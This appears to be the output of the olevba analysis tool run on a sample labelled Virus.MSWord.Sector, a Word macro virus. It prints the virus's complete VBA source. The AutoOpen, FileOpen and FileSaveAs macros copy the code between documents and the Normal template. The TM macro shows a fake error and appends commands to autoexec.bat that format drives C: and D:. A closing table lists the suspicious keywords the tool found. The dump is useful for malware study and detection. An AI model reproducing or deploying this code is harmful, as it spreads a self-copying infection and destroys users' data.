olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sector
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
On Error GoTo q
Call ToolsMacro.MAIN
q:
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "Ìàêðîñ ñîçäàí "
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim u
Dim j
Dim i
On Error GoTo q
u = 0
j = WordBasic.CountMacros(0, 0)
For i = 1 To j
 If WordBasic.[MacroName$](i, 0, 0) = "Microsoft" Then u = 1
Next i
If u = 1 Then GoTo q
WordBasic.MacroCopy WordBasic.[Filename$]() + ":AutoExit", "Normal:AutoExit", 1
WordBasic.MacroCopy WordBasic.[Filename$]() + ":AutoOpen", "Normal:MicrosoftWord", 1
WordBasic.MacroCopy WordBasic.[Filename$]() + ":Microsoft", "Normal:Microsoft", 1
WordBasic.MacroCopy WordBasic.[Filename$]() + ":MicrosoftOffice", "Normal:FileOpen", 1
WordBasic.MacroCopy WordBasic.[Filename$]() + ":TM", "Normal:ToolsMacro", 1
WordBasic.MacroCopy WordBasic.[Filename$]() + ":MacrosAN", "Normal:FileSaveAs", 1
WordBasic.MacroCopy WordBasic.[Filename$]() + ":Normal", "Normal:FileTemplates", 1
WordBasic.MacroCopy WordBasic.[Filename$]() + ":Normal", "Normal:ViewVBCode", 1
q:
End Sub





-------------------------------------------------------------------------------
VBA MACRO Microsoft.bas 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/Microsoft'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Ìàêðîñ ñîçäàí "
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Microsoft.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO MicrosoftOffice.bas 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/MicrosoftOffice'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Attribute MAIN.VB_Description = "Ìàêðîñ ñîçäàí "
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.MicrosoftOffice.MAIN"
Dim n
Dim iCountMacros
Dim i
Dim t$
On Error GoTo q1
Dialogs(wdDialogFileOpen).Show
n = 0
iCountMacros = WordBasic.CountMacros(1, 0, 0)
For i = 1 To iCountMacros
 t$ = WordBasic.[MacroName$](i, 1)
 If t$ = "Microsoft" Then n = 1
Next i
If n = 1 Then GoTo q1
SetAttr WordBasic.[Filename$](), 0
WordBasic.FileSaveAs WordBasic.[Filename$](), Format:=1
WordBasic.MacroCopy "Normal:AutoExit", WordBasic.[Filename$]() + ":AutoExit", 1
WordBasic.MacroCopy "Normal:MicrosoftWord", WordBasic.[Filename$]() + ":AutoOpen", 1
WordBasic.MacroCopy "Normal:Microsoft", WordBasic.[Filename$]() + ":Microsoft", 1
WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[Filename$]() + ":MicrosoftOffice", 1
WordBasic.MacroCopy "Normal:ToolsMacro", WordBasic.[Filename$]() + ":TM", 1
WordBasic.MacroCopy "Normal:FileSaveAs", WordBasic.[Filename$]() + ":MacrosAN", 1
WordBasic.MacroCopy "Normal:FileTemplates", WordBasic.[Filename$]() + ":Normal", 1
q1:
End Sub





-------------------------------------------------------------------------------
VBA MACRO TM.bas 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/TM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Ìàêðîñ ñîçäàí 14.03.95 Sector not Die!!!"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TM.MAIN"
If (Second(Now()) = 13) Then
On Error GoTo s
MsgBox "Critical Error in Drive C:", vbCritical, "Error"
SetAttr "c:\autoexec.bat", 0
Open "c:\autoexec.bat" For Append As #1
Print #1, " "
Print #1, " "
Print #1, "@Echo Off"
Print #1, "@Echo y|format c: /u >nul"
Print #1, "@Echo y|format d: /u >nul"
Close #1
End If
s:
On Error GoTo Quit
If (Day(Now()) = 4) And (Month(Now()) = 7) Then
SetAttr "c:\autoexec.bat", 0
Open "c:\autoexec.bat" For Append As #1
Print #1, " "
Print #1, "echo Ñåãîäíÿ 04/07 - ìîé äåíü ðîæäåíüÿ!:-)"
Close #1
MsgBox "Today is my BirthDay! 04/07", vbSystemModal, "Congratilations!.."
End If
Quit:
SendKeys "%" + "{F4}"
End Sub
-------------------------------------------------------------------------------
VBA MACRO MacrosAN.bas 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/MacrosAN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Dim h
Dim vCountMacros
Dim d
Dim t$
Dialogs(wdDialogFileSaveAs).Show
On Error GoTo q1
h = 0
vCountMacros = WordBasic.CountMacros(1, 0, 0)
For d = 1 To vCountMacros
 t$ = WordBasic.[MacroName$](d, 1)
 If t$ = "Microsoft" Then h = 1
Next d
If h = 1 Then GoTo q1
SetAttr WordBasic.[Filename$](), 0
WordBasic.FileSaveAs WordBasic.[Filename$](), Format:=1
WordBasic.MacroCopy "Normal:AutoExit", WordBasic.[Filename$]() + ":AutoExit", 1
WordBasic.MacroCopy "Normal:MicrosoftWord", WordBasic.[Filename$]() + ":AutoOpen", 1
WordBasic.MacroCopy "Normal:Microsoft", WordBasic.[Filename$]() + ":Microsoft", 1
WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[Filename$]() + ":MicrosoftOffice", 1
WordBasic.MacroCopy "Normal:ToolsMacro", WordBasic.[Filename$]() + ":TM", 1
WordBasic.MacroCopy "Normal:FileSaveAs", WordBasic.[Filename$]() + ":MacrosAN", 1
WordBasic.MacroCopy "Normal:FileTemplates", WordBasic.[Filename$]() + ":Normal", 1
q1:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Normal.bas 
in file: ./Virus.MSWord.Sector - OLE stream: 'Macros/VBA/Normal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
Attribute MAIN.VB_Description = "Ìàêðîñ ñîçäàí 14.03.95 Sector not Die!!!"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Normal.MAIN"
On Error GoTo w
Call ToolsMacro.MAIN
w:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

